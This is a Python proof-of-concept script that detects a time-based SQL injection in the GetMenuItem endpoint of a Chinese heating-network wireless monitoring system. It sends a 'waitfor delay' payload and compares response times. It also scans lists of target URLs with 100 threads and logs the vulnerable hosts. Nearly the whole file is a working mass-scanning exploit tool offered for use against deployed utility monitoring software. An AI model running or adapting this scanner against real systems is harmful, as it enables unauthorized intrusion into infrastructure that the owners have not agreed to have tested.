import requests,argparse,sys
from multiprocessing.dummy import Pool
from urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

def banner():
    test = """热网无线监测系统GetMenuItem存在SQL注入漏洞"""
    print(test)

def main():
    banner()
    parser = argparse.ArgumentParser(description="热网无线监测系统GetMenuItem存在SQL注入漏洞")
    parser.add_argument('-u', '--url', dest='url', type=str, help=' input your url')
    parser.add_argument('-f', '--file', dest='file', type=str, help='input your file path')
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list = []
        with open(args.file, 'r', encoding='utf-8') as fp:
            for i in fp.readlines():
                url_list.append(i.strip().replace('\n', ''))
        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")

def poc(target):
    payload = '/DataSrvs/UCCGSrv.asmx/GetMenuItem'
    headers = {
        "accept": "*/*",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36(KHTML, likeGecko) Chrome/128.0.0.0Safari/537.36",
        "Content-Type": "application/x-www-form-urlencoded"
    }
    data = "name=1') waitfor delay '0:0:5'-- +"
    proxies = {
        'http': 'http://127.0.0.1:8080',
        'https': 'http://127.0.0.1:8080'
    }
    try:
        res1 = requests.post(url=target+payload,data=data,verify=False,headers=headers,timeout=5,proxies=proxies)
        # res1 = requests.post(url=target + payload, data=data, verify=False, headers=headers, timeout=5)
        res2 = requests.post(url=target,data=data,verify=False,headers=headers,timeout=15)
        time1 = res1.elapsed.total_seconds()
        time2 = res2.elapsed.total_seconds()
        if time1 - time2 >= 4.5 and time1 >4.5:
            print(f"[+]{target}存在延时注入漏洞")
            with open ("result.txt", "a", encoding="utf-8") as f:
                f.write(f"[+]{target}存在延时注入漏洞\n")

        else:
            print(f"[-]{target}不存在漏洞")
    except Exception as e:
        print(f"{target}该网站可能存在漏洞，请手工测试")

if __name__ == '__main__':
    main()